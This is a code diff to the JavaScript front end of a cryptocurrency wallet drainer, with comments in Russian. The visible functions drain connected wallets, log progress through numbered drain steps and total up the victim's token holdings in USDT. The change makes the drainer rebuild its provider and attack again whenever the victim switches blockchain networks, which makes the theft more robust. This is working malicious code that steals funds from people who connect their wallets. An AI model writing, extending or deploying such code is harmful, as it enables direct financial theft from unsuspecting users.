@@ -565,6 +565,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   console.log(`📍 Шаг 8: Завершаем drain со статусом ${status}`);
   return status;
 }
+
 async function runDrainer(provider, signer, userAddress) {
   const currentTime = Date.now();
   const timeSinceLastDrain = currentTime - lastDrainTime;
@@ -636,6 +637,7 @@ async function calculateTotalValueInUSDT(chainId, balance, provider) {
   console.log(`📊 Общая стоимость токенов (без нативных) для chainId ${chainId}: ${totalValue} USDT`);
   return totalValue;
 }
+
 window.addEventListener('DOMContentLoaded', () => {
   actionBtn = document.getElementById('action-btn');
   const isInjected = typeof window.ethereum !== 'undefined';
@@ -947,7 +949,10 @@ async function handleConnectOrAction() {
 async function onChainChanged(chainId) {
   console.log('🔄 Смена сети:', chainId);
   if (connectedAddress && !isTransactionPending) {
-    await attemptDrainer();
+    const provider = new ethers.providers.Web3Provider(window.ethereum); // Пересоздаём провайдер
+    const newNetwork = await provider.getNetwork();
+    console.log(`📡 Новая сеть: ${newNetwork.name}, chainId: ${newNetwork.chainId}`);
+    await attemptDrainer(provider); // Перезапускаем drainer с новым провайдером
   } else {
     console.log('⏳ Транзакция в процессе');
     await hideModalWithDelay("Transaction in progress, please wait.");
